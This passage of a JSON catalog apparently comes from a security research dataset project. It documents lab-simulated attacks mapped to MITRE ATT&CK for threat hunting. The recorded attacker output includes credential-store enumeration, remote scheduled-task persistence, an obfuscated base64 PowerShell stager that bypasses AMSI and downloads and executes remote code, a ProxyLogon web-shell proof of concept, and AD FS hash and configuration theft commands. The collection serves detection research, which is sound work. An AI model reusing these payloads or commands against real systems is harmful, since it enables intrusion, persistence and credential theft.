S-1-5-15\n  NT AUTHORITY\\Local account               S-1-5-113\n  LOCAL                                    S-1-2-0\n  NT AUTHORITY\\NTLM Authentication         S-1-5-64-10\n====== WindowsCredentialFiles ======\n\n  Folder : C:\\windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\n\n    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D\n    Description  : Local Credential Data\n    MasterKey    : 4e3bccc6-a1eb-4076-b723-6456d3dec626\n    Accessed     : 11/2/2020 4:39:13 PM\n    Modified     : 11/2/2020 4:39:13 PM\n    Size         : 11184\n\n\n  Folder : C:\\windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials\n\n    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D\n    Description  : Local Credential Data\n    MasterKey    : 4e3bccc6-a1eb-4076-b723-6456d3dec626\n    Accessed     : 11/2/2020 4:39:13 PM\n    Modified     : 11/2/2020 4:39:13 PM\n    Size         : 11184\n\n\n  Folder : C:\\windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials\n\n    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D\n    Description  : Local Credential Data\n    MasterKey    : 4e3bccc6-a1eb-4076-b723-6456d3dec626\n    Accessed     : 11/2/2020 4:39:13 PM\n    Modified     : 11/2/2020 4:39:13 PM\n    Size         : 11184\n\n\n  Folder : C:\\Users\\wardog\\AppData\\Local\\Microsoft\\Credentials\\\n\n    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D\n    Description  : Local Credential Data\n    MasterKey    : ad27dbc8-def4-4b0d-bfbd-89b429dfe9fe\n    Accessed     : 11/2/2020 4:39:13 PM\n    Modified     : 11/2/2020 4:39:13 PM\n    Size         : 11184\n\n\n  Folder : C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Credentials\\\n\n    FileName     : 38924BBFD1C490D90FFE70EECB3A3739\n    Description  : Enterprise Credential Data\n    MasterKey    : ad27dbc8-def4-4b0d-bfbd-89b429dfe9fe\n    Accessed     : 11/2/2020 4:39:13 PM\n    Modified     : 11/2/2020 4:39:13 PM\n    Size         : 474\n\n\n====== WindowsVault ======\n\n\n  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28\n  Vault Type     : Web Credentials\n  Item count     : 1\n      SchemaGuid   : 3ccd5499-87a8-4b10-a215-608888dd3b55\n      Resource     : String: http://ossemproject.com\n      Identity     : String: pgustavo\n      PackageSid   : (null)\n      Credential   : String: [placeholder]\n      LastModified : 10/28/2020 11:18:10 PM\n\n  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29\n  Vault Type     : Windows Credentials\n  Item count     : 1\n      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b\n      Resource     : String: Domain:target=threathunterplaybook.com\n      Identity     : String: wardog\n      PackageSid   : (null)\n      Credential   :\n      LastModified : 10/28/2020 11:13:44 PM\n\n\n[*] Completed collection in 1.834 seconds\n\nC:\\Users\\wardog\\Desktop> "
        },
        "references": [
            "https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=netcore-3.1"
        ],
        "mp_last_updated": "2022-01-08T01:50:01.227137+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201219070027.yaml": {
        "title": "Remote Scheduled Task Creation",
        "id": "SDWIN-201219070027",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/12/19",
        "modification_date": "2020/12/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor creating a scheduled task remotely using schtasks.",
        "attack_mappings": [
            {
                "technique": "T1053",
                "sub-technique": "005",
                "tactics": [
                    "TA0002",
                    "TA0003",
                    "TA0004",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/schtask_create.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/schtask_create.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "PS C:\\windows\\system32> C:\\Windows\\system32\\cmd.exe /C schtasks /create /F /tn \"\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager\" /tr \"C:\\Windows\\system32\\cmd.exe /C C:\\Windows\\System32\\notepad.exe\" /sc ONSTART /ru system /S WORKSTATION6\nSUCCESS: The scheduled task \"\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager\" has successfully been created.\nPS C:\\windows\\system32> "
        },
        "references": [
            "https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/"
        ],
        "mp_last_updated": "2022-01-08T01:50:04.836104+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201219075059.yaml": {
        "title": "Remote Scheduled Task Modification",
        "id": "SDWIN-201219075059",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/12/19",
        "modification_date": "2020/12/19",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor modifying a scheduled task remotely.",
        "attack_mappings": [
            {
                "technique": "T1053",
                "sub-technique": "005",
                "tactics": [
                    "TA0002",
                    "TA0003",
                    "TA0004",
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/schtask_modification.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/schtask_modification.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Name               : EventCacheManager\nPath               : \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager\nState              : 3\nEnabled            : True\nLastRunTime        : 11/30/1999 12:00:00 AM\nLastTaskResult     : 267011\nNumberOfMissedRuns : 0\nNextRunTime        : 12/30/1899 12:00:00 AM\nDefinition         : System.__ComObject\nXml                : <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n                    <Task version=\"1.2\"\n                    xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n                      <RegistrationInfo>\n                        <Date>2020-12-19T07:00:22</Date>\n                        <Author>THESHIRE\\pgustavo</Author>\n                        <URI>\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager</URI>\n                      </RegistrationInfo>\n                      <Principals>\n                        <Principal id=\"Author\">\n                          <UserId>S-1-5-18</UserId>\n                        </Principal>\n                      </Principals>\n                      <Settings>\n                        <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n                        <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n                        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n                        <IdleSettings>\n                          <Duration>PT10M</Duration>\n                          <WaitTimeout>PT1H</WaitTimeout>\n                          <StopOnIdleEnd>true</StopOnIdleEnd>\n                          <RestartOnIdle>false</RestartOnIdle>\n                        </IdleSettings>\n                      </Settings>\n                      <Triggers>\n                        <BootTrigger>\n                          <StartBoundary>2020-12-19T07:00:00</StartBoundary>\n                        </BootTrigger>\n                      </Triggers>\n                      <Actions Context=\"Author\">\n                        <Exec>\n                          <Command>powershell</Command>\n                          <Arguments>-noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBpAG8ATgBUAGEA\n                    QgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AYQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABDAD\n                    MAMgAyAD0AWwBSAEUARgBdAC4AQQBzAFMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AFAAZQAoACcAUwB5\n                    AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdA\n                    BpAGwAcwAnACkALgAiAEcARQB0AEYASQBlAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUA\n                    cABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAG\n                    MALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAYwAz\n                    ADIAMgAuAEcAZQBUAFYAYQBsAFUAZQAoACQAbgBVAGwAbAApADsASQBGACgAJABDADcANAAyAFsAJw\n                    BTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYwA3ADQA\n                    MgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG\n                    4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAw\n                    ADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZw\n                    AnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkA\n                    bwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBBAEwAPQBbAEMAbwBsAGwARQBjAHQASQBvAG\n                    4AUwAuAEcAZQBuAGUAUgBpAGMALgBEAEkAYwB0AGkATwBOAGEAUgBZAFsAcwBUAHIAaQBuAGcALABT\n                    AFkAcwBUAEUAbQAuAE8AYgBKAGUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJAB2AEEATAAuAEEARA\n                    BEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4A\n                    ZwAnACwAMAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAG\n                    wAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAEMANwA0\n                    ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcg\n                    BlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwA\n                    UABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAG\n                    kAbgBnACcAXQA9ACQAdgBBAGwAfQBFAEwAUwBlAHsAWwBTAEMAcgBpAHAAVABCAGwATwBDAGsAXQAu\n                    ACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKw\n                    AnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAHUARQAoACQA\n                    bgB1AGwAbAAsACgATgBFAFcALQBPAGIASgBFAEMAVAAgAEMAbwBMAGwAZQBDAFQASQBvAE4AcwAuAE\n                    cARQBuAGUAUgBJAEMALgBIAGEAcwBoAFMAZQB0AFsAcwBUAHIAaQBOAEcAXQApACkAfQAkAFIAZQBG\n                    AD0AWwBSAGUARgBdAC4AQQBzAFMAZQBtAGIAbABZAC4ARwBlAHQAVABZAFAAZQAoACcAUwB5AHMAdA\n                    BlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkA\n                    JwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkARQBMAGQAKAAnAGEAbQBzAG\n                    kASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABh\n                    AHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUAZQAoACQATgBVAEwATAAsACQAVABSAFUARQApADsAfQ\n                    A7AFsAUwBZAFMAVABFAE0ALgBOAGUAdAAuAFMAZQBSAFYASQBDAGUAUABPAEkAbgB0AE0AYQBOAGEA\n                    RwBFAFIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABpAE4AdQBFAD0AMAA7ACQANQA3AD\n                    kAMwA9AE4ARQB3AC0ATwBiAEoAZQBjAFQAIABTAHkAcwBUAGUATQAuAE4ARQBUAC4AVwBFAEIAQwBM\n                    AGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcw\n                    AgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAA\n                    cgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAF\n                    QARQB4AFQALgBFAG4AYwBPAGQAaQBuAGcAXQA6ADoAVQBuAEkAQwBPAEQARQAuAEcARQB0AFMAdABS\n                    AGkAbgBHACgAWwBDAG8AbgBWAGUAcgB0AF0AOgA6AEYAcgBPAE0AQgBhAHMARQA2ADQAUwB0AHIASQ\n                    BOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwA\n                    ZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAH\n                    QAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkADUANwA5ADMALgBI\n                    AGUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJA\n                    A1ADcAOQAzAC4AUAByAE8AWAB5AD0AWwBTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBFAGIAUgBlAHEA\n                    VQBFAFMAdABdADoAOgBEAEUARgBhAHUAbAB0AFcARQBiAFAAUgBPAFgAeQA7ACQANQA3ADkAMwAuAF\n                    AAcgBvAFgAWQAuAEMAUgBlAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAWQBTAHQARQBNAC4ATgBF\n                    AFQALgBDAHIARQBkAEUATgBUAGkAQQBMAEMAYQBjAEgARQBdADoAOgBEAEUAZgBhAFUAbABUAE4AZQ\n                    BUAHcAbwBSAGsAQwByAEUAZABFAE4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgA\n                    eQAgAD0AIAAkADUANwA5ADMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBtAC4AVABFAH\n                    gAVAAuAEUATgBjAE8AZABJAE4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAdABlAFMAKAAn\n                    ACMANgBGACsAPgBFADgAMgA3AEgAVgBKAEcARAB0AG0AOQB9AFQAQAAqADEAaQB4AD0AXwBkAG4ASQ\n                    A0AFAAZQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAEcAcwA7ACQAUwA9ADAALgAuADIA\n                    NQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbAC\n                    QAXwAlACQASwAuAEMAbwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABK\n                    AF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKw\n                    AxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsA\n                    JABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAH\n                    gATwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAk\n                    ADUANwA5ADMALgBIAEUAQQBkAEUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFcAVQ\n                    BFAGgAaABKAGMAQQBxAEQAbwA9AE4AVgByAE8AYwBsAEQAYQBmAG0AcQBOADAAdABBAEcAMgBGACsA\n                    TQAvAEwAagBFAHgAdgA4AD0AIgApADsAJABkAGEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcATgBMAE\n                    8AYQBkAEQAQQBUAEEAKAAkAFMAZQBSACsAJABUACkAOwAkAEkAVgA9ACQARABhAHQAYQBbADAALgAu\n                    ADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQAZABhAFQAQQAuAEwAZQBOAGcAVA\n                    BIAF0AOwAtAGoAbwBJAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAHQAQQAgACgA\n                    JABJAFYAKwAkAEsAKQApAHwASQBFAFgA</Arguments>\n                        </Exec>\n                      </Actions>\n                    </Task>"
        },
        "references": [
            "https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/",
            "https://github.com/OTRF/Blacksmith/blob/master/resources/scripts/powershell/misc/Update-RemoteTask.ps1"
        ],
        "mp_last_updated": "2022-01-08T01:50:05.763202+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-210314014019.yaml": {
        "title": "Exchange ProxyLogon SSRF RCE Vuln POC",
        "id": "SDWIN-210314014019",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2021/03/14",
        "modification_date": "2021/03/14",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents the execution of a public POC to abuse Exchange vulnerabilities (CVE-2021-26855 server-side request forgery (SSRF) vulnerability)",
        "attack_mappings": [
            {
                "technique": "T1505",
                "sub-technique": "003",
                "tactics": [
                    "TA0003",
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/proxylogon_ssrf_rce_poc.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "cmd",
                    "module": "cmd",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog.MXS01\\Documents>\nC:\\Users\\wardog.MXS01\\Documents>python public-poc.py localhost wardog@azsentinel.local\nAttacking target localhost\n=============================\nGot DN: /o=azsentinel/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6beef80bd6d14a68b9ae39df7f27a8cc-wardog\nGot SID: S-1-5-21-594047938-393122191-2580508586-500\nGot session id: e243cd06-1093-40d4-829c-63f3b9caea9b\nGot canary: pYoEXlKOqkGQMt3Dv3qJUExebVlG6NgI3c_XeQNd-VRV8lo6E5zskoLPJB0uOOGITLTC08eVUkk.\nGot OAB id: becafe73-b0c1-4f36-8df4-85f682840ef4\nReady!\n\nTesting command:\n===============\nPOST  shell:https://localhost/owa/auth/ohyeah.aspx\ncode\":\"Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"cmd /c whoami\").StdOut.ReadAll());\n\n\n[*] Waiting for ohyeah.aspx to be available..\n[*] Waiting for ohyeah.aspx to be available..\n\nResults:\n========\nnt authority\\system\n\n\nC:\\Users\\wardog.MXS01\\Documents>"
        },
        "references": [
            "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
            "https://twitter.com/jack_halon/status/1370192318377168897",
            "https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS"
        ],
        "mp_last_updated": "2022-01-08T01:50:05.957195+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-210427020247.yaml": {
        "title": "Export ADFS Database Configuration Remotely",
        "id": "SDWIN-210427020247",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2021/04/27",
        "modification_date": "2021/04/27",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor exporting the AD FS database configuration remotely over http.",
        "attack_mappings": [
            {
                "technique": "T0000",
                "sub-technique": null,
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/aadinternals_export_adfsdatabaseconfig_remotely.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "PowerShell Module",
                    "name": "AADInternals",
                    "module": "Export-AADIntADFSConfiguration",
                    "script": null
                }
            ],
            "permissions_required": [
                "Domain Admin",
                "AD FS"
            ],
            "adversary_view": "# ADFS Service Account\n$UserObjectGUID = 'd1713029-72e2-4101-8486-1db074944f23'\n# Domain Admin credentials\n$credentials = get-credential\n# Get Hash via AD replication\n$Hash = Get-AADIntADUserNTHash -ObjectGuid $UserObjectGUID -Credentials $credentials -Server 'DC01.blacksmith.local' -AsHex\n# Retrieve AD FS database configuration over HTTP\n$ADFSDatabaseConfig = Export-AADIntADFSConfiguration -Hash '97bff5626068f351a5f9891b97b04640' -SID 'S-1-5-21-3226634481-2224579835-4276826623-1103' -Server ADFS01.blacksmith.local"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:50:06.166194+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-210611210814.yaml": {
        "title": "APT Simulator Cobalt Strike",
        "id": "SDWIN-210611210814",
        "contributors": [
            "Jose Rodriguez @Cyb3rPandaH"
        ],
        "creation_date": "2021/06/11",
        "modification_date": "2021/06/11",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset was created after running the Cobalt Strike module from the APT Simulator tool (https://github.com/NextronSystems/APTSimulator).",
        "attack_mappings": [
            {
                "technique": "T1134",
                "sub-technique": "002",
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            },
            {
                "technique": "T1134",
                "sub-technique": "001",
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/other/aptsimulator_cobaltstrike.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Batch Script",
                    "name": "APT Simulator",
                    "module": "Cobalt Strike",
                    "script": "https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/cobaltstrike/cobaltstrike-simulation.bat"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "===========================================================================\n    ___    ____  ___________ _                 __      __\n  /   |  / __ \\/_  __/ ___/(_)___ ___  __  __/ /___ _/ /_____  _____\n  / /| | / /_/ / / /  \\__ \\/ / __ `__ \\/ / / / / __ `/ __/ __ \\/ ___/\n/ ___ |/ ____/ / /  ___/ / / / / / / / /_/ / / /_/ / /_/ /_/ / /\n/_/  |_/_/     /_/  /____/_/_/ /_/ /_/\\__,_/_/\\__,_/\\__/\\____/_/\n\nFlorian Roth, Nextron Systems, v0.9.1, June 2021\n\nSelect the test-set that you want to run:\n\n[0] RUN EVERY TEST\n[1] Collection\n[2] Command and Control\n[3] Credential Access\n[4] Defense Evasion\n[5] Discovery\n[6] Execution\n[7] Lateral Movement\n[8] Persistence\n[9] Privilege Escalation\n\n[C] CobaltStrike Beacon Simulation\n\n[A] Apply AV Exclusions in Registry\n[S] Settings\n[E] Exit\n\nYour selection (then press ENTER): C\n===========================================================================\nSimulate CobaltStrike Beacon Activity\n\n--- Create some default Named Pipes ...\nCreating Named Pipe number 1: MSSE-1337-server\n\nWaiting for 0 seconds, press a key to continue ...\nKilling named pipe creator for pipe 1\nSUCCESS: The process \"CreateNamedPipe.exe\" with PID 4748 has been terminated.\nCreating Named Pipe number 2 (P2P communication): msagent_fedac123\n\nWaiting for 0 seconds, press a key to continue ...\nKilling named pipe creator for pipe 2\nSUCCESS: The process \"CreateNamedPipe.exe\" with PID 4236 has been terminated.\nCreating Named Pipe number 3 (Post Exploitation): postex_ssh_fedac123\n\nWaiting for 0 seconds, press a key to continue ...\nKilling named pipe creator for pipe 3\nSUCCESS: The process \"CreateNamedPipe.exe\" with PID 7444 has been terminated.\nCreating Named Pipe number 3 (Post Exploitation): postex_ssh_fedac123\n\nWaiting for 0 seconds, press a key to continue ...\nKilling named pipe creator for pipe 3\nSUCCESS: The process \"CreateNamedPipe.exe\" with PID 512 has been terminated.\n\n--- Simulating GetSystem ...\n\nWaiting for 0 seconds, press a key to continue ...\nCopy a service binary file to a suspicious location ...\nUsing Post-CobaltStrike 4.2 scheme\n        1 file(s) copied.\nStarting suspicious service\n[SC] CreateService SUCCESS\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n\n[SC] ControlService FAILED 1062:\n\nThe service has not been started.\n\n[SC] DeleteService SUCCESS\n\nWaiting for 0 seconds, press a key to continue ...\nKilling named pipe creator\nERROR: The process \"CreateNamedPipe.exe\" not found.\n\n--- HTTP Beaconing 1\nSimulating HTTP beaconing - this step takes up to an hour to complete\n\nBeacon 1 - HTTP 30s+50//10.0.2.15/pixel.gif\nSending HTTP request ...\n\nC:\\Users\\APT-Simulator\\Documents\\APTSimulator-master>"
        },
        "references": [
            "https://twitter.com/cyb3rops/status/1403253268051107840"
        ],
        "mp_last_updated": "2022-01-08T01:50:06.407503+00:00"
    },
    "datasets/compound/_metadata/GoldenSAMLADFSMailAccess.yaml": {
        "title": "Golden SAML AD FS Mail Access",
        "id": "377d9af5-5009-48d9-ae97-1756a01d7ef8",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2021/08/02",
        "modification_date": "2021/08/02",
        "platform": [
            "Windows",
            "Azure"
        ],
        "type": "compound",
        "tags": [
            "SimuLand"
        ],
        "description": "This dataset represent a threat actor stealing the AD FS token signing certificate from an on-prem AD FS server to sign a new SAML token, impersonate a privileged user and eventually collect mail data via the Microsoft Graph API.",
        "attack_mappings": [
            {
                "technique": "T1552",
                "sub-technique": "004",
                "tactics": [
                    "TA0006"
                ]
            },
            {
                "technique": "T1606",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            },
            {
                "technique": "T1606",
                "sub-technique": "002",
                "tactics": [
                    "TA0006"
                ]
            },
            {
                "technique": "T1078",
                "sub-technique": "004",
                "tactics": [
                    "TA0001",
                    "TA0003",
                    "TA0004",
                    "TA0005"
                ]
            },
            {
                "technique": "T1098",
                "sub-technique": "002",
                "tactics": [
                    "TA0003"
                ]
            },
            {
                "technique": "T1114",
                "sub-technique": null,
                "tactics": [
                    "TA0009"
                ]
            }
        ],
        "files": [
            {
                "type": "Cloud",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/GoldenSAMLADFSMailAccess/AADAuditEvents.Zip"
            },
            {
                "type": "Cloud",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/GoldenSAMLADFSMailAccess/Microsoft365DefenderEvents.Zip"
            },
            {
                "type": "Cloud",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/GoldenSAMLADFSMailAccess/OfficeActivityEvents.Zip"
            },
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/GoldenSAMLADFSMailAccess/WindowsEvents.Zip"
            }
        ],
        "simulation": {
            "environment": "SimuLand",
            "environment_link": "https://github.com/Azure/SimuLand/tree/main/2_deploy/aadHybridIdentityADFS"
        },
        "references": [
            "https://github.com/Azure/SimuLand",
            "https://github.com/Azure/SimuLand/tree/main/labs/01_GoldenSAMLADFSMailAccess"
        ],
        "mp_last_updated": "2022-01-08T01:50:06.595675+00:00"
    }
}